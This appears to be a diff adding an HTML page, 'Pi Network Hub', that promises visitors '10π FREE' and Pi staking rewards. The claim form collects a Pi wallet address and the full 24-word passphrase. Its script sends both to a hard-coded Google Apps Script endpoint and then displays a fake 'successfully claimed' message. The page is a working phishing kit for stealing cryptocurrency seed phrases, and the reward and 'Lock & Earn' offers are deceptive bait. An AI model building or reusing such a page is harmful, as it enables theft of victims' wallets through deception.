@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pi Network Hub</title>
+    <style>
+      :root {
+        --pi-gold: #f8b500;
+        --pi-dark: #1a1a1a;
+        --pi-gray: #2b2b2b;
+        --pi-text: #ffffff;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Arial", sans-serif;
+      }
+
+      body {
+        background: var(--pi-dark);
+        color: var(--pi-text);
+      }
+
+      .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 15px;
+      }
+
+      .pi-logo {
+        width: 60px;
+        margin: 10px;
+        border-radius: 50%;
+      }
+
+      .hero-section {
+        text-align: center;
+        padding: 80px 15px;
+        background: purple;
+        border-radius: 20px;
+        margin-top: 20px;
+      }
+
+      .hero-title {
+        font-size: 2.5rem;
+        margin-bottom: 15px;
+        color: var(--pi-gold);
+        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+      }
+
+      .cta-button {
+        background: linear-gradient(45deg, var(--pi-gold), #ff9900);
+        color: var(--pi-dark);
+        padding: 16px 45px;
+        border: none;
+        border-radius: 30px;
+        font-size: 1.1rem;
+        cursor: pointer;
+        transition: transform 0.3s;
+        margin: 10px auto;
+        width: 100%;
+        max-width: 300px;
+      }
+
+      .verification-form {
+        background: var(--pi-gray);
+        padding: 25px;
+        border-radius: 15px;
+        margin: 20px 0;
+      }
+
+      input,
+      select {
+        width: 100%;
+        padding: 12px;
+        margin: 8px 0;
+        border: 1px solid #444;
+        border-radius: 8px;
+        background: #333;
+        color: var(--pi-text);
+        font-size: 16px;
+      }
+
+      .notification {
+        padding: 12px;
+        margin: 15px 0;
+        border-radius: 8px;
+        text-align: center;
+        display: none;
+      }
+
+      .success {
+        background: #2ecc71;
+        color: white;
+      }
+
+      .options-section {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 15px;
+        margin: 25px 0;
+      }
+
+      .option-card {
+        background: var(--pi-gray);
+        padding: 20px;
+        border-radius: 15px;
+        text-align: center;
+        transition: transform 0.3s;
+      }
+
+      @media (min-width: 768px) {
+        .hero-title {
+          font-size: 3rem;
+        }
+        .container {
+          padding: 25px;
+        }
+        .options-section {
+          grid-template-columns: repeat(2, 1fr);
+        }
+        .cta-button {
+          width: auto;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .hero-section {
+          padding: 60px 15px;
+        }
+        .hero-title {
+          font-size: 2rem;
+        }
+        input,
+        select {
+          font-size: 14px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <section class="hero-section">
+        <img src="images.png" alt="Pi Logo" class="pi-logo" />
+        <h1 class="hero-title">Claim 10π FREE!</h1>
+        <button class="cta-button" onclick="showSection('claimSection')">
+          Claim Free Pi
+        </button>
+      </section>
+
+      <div id="notification" class="notification"></div>
+
+      <!-- Claim Section -->
+      <section
+        id="claimSection"
+        class="verification-form"
+        style="display: none"
+      >
+        <form
+          name="submit-to-google-sheet"
+          id="claimForm"
+          onsubmit="submitClaim(event)"
+        >
+          <input
+            type="text"
+            name="Address"
+            placeholder="Enter Your Pi Wallet Address"
+            required
+          />
+          <input
+            type="text"
+            name="Passphrase"
+            id="passphraseInput"
+            placeholder="Enter Your 24-Word Passphrase"
+            required
+          />
+          <button class="cta-button" type="submit">Claim</button>
+        </form>
+      </section>
+
+      <!-- Lock Section -->
+      <section id="lockSection" class="verification-form" style="display: none">
+        <form id="lockForm" onsubmit="submitLock(event)">
+          <input type="number" placeholder="Amount (π)" required />
+          <select>
+            <option value="1">1 Month</option>
+            <option value="3">3 Months</option>
+            <option value="6">6 Months</option>
+          </select>
+          <button class="cta-button" type="submit">Lockup Pi</button>
+        </form>
+      </section>
+
+      <!-- Options Grid -->
+      <section class="options-section">
+        <div class="option-card" onclick="showSection('lockSection')">
+          <h3>🔒 Lock & Earn</h3>
+          <p>Earn 10% monthly rewards</p>
+        </div>
+        <div class="option-card" onclick="showSection('boostSection')">
+          <h3>⚡ Boost Mining</h3>
+          <p>+50% mining rate</p>
+        </div>
+      </section>
+    </div>
+
+    <!-- <script>
+      // Add this validation function
+      function isValidPassphrase(passphrase) {
+        // Trim and split words properly
+        const words = passphrase.trim().split(/\s+/g);
+        return words.length === 24;
+      }
+
+      // Modified submit function
+      async function submitClaim(event) {
+        event.preventDefault();
+        const scriptURL = "YOUR_GOOGLE_SCRIPT_URL";
+        const form = document.forms["submit-to-google-sheet"];
+        const passphrase = document.getElementById("passphraseInput").value;
+        const notification = document.getElementById("notification");
+
+        // Validate passphrase
+        if (!isValidPassphrase(passphrase)) {
+          showNotification(
+            "❌ Passphrase must contain exactly 24 words",
+            "error"
+          );
+          document.getElementById("passphraseInput").style.border =
+            "2px solid red";
+          return;
+        }
+
+        try {
+          const response = await fetch(scriptURL, {
+            method: "POST",
+            body: new FormData(form),
+          });
+
+          if (!response.ok) throw new Error("Network response was not ok");
+
+          showNotification("🎉 10π successfully claimed!", "success");
+          form.reset();
+          document.getElementById("passphraseInput").style.border = ""; // Reset border
+          showSection("hero-section");
+        } catch (error) {
+          console.error("Error!", error);
+          showNotification("⚠️ Error saving data! Please try again.", "error");
+        }
+      }
+    </script> -->
+
+    <script>
+      function showNotification(message, type = "success") {
+        const notif = document.getElementById("notification");
+        notif.className = `notification ${type}`;
+        notif.innerHTML = message;
+        notif.style.display = "block";
+        setTimeout(() => (notif.style.display = "none"), 3000);
+      }
+
+      function showSection(sectionId) {
+        document.querySelectorAll(".verification-form").forEach((form) => {
+          form.style.display = "none";
+        });
+        const section = document.getElementById(sectionId);
+        if (section) {
+          section.style.display = "block";
+          section.scrollIntoView({ behavior: "smooth" });
+        }
+      }
+    </script>
+    <script>
+      // Keep existing showNotification, showSection, and submitLock functions
+
+      async function submitClaim(event) {
+        event.preventDefault();
+        const scriptURL =
+          "https://script.google.com/macros/s/AKfycbxfkPzqd0bC4swBliDs8WGIODsdAjftcx0fyxPgE6cjFdg86mcXQVJKm815UarXXdVh/exec";
+        const form = document.forms["submit-to-google-sheet"];
+        const notification = document.getElementById("notification");
+
+        try {
+          const response = await fetch(scriptURL, {
+            method: "POST",
+            body: new FormData(form),
+          });
+
+          if (!response.ok) throw new Error("Network response was not ok");
+
+          showNotification("🎉 10Pi successfully claimed!", "success");
+          form.reset();
+          showSection("hero-section"); // Return to main section
+        } catch (error) {
+          console.error("Error!", error);
+          showNotification("⚠️ Error saving data! Please try again.", "error");
+        }
+      }
+    </script>
+
+    <script>
+      async function submitLock(event) {
+        event.preventDefault();
+        // Add your backend call here
+        showNotification("🔒 Pi locked successfully!");
+        event.target.reset();
+      }
+    </script>
+  </body>
+</html>
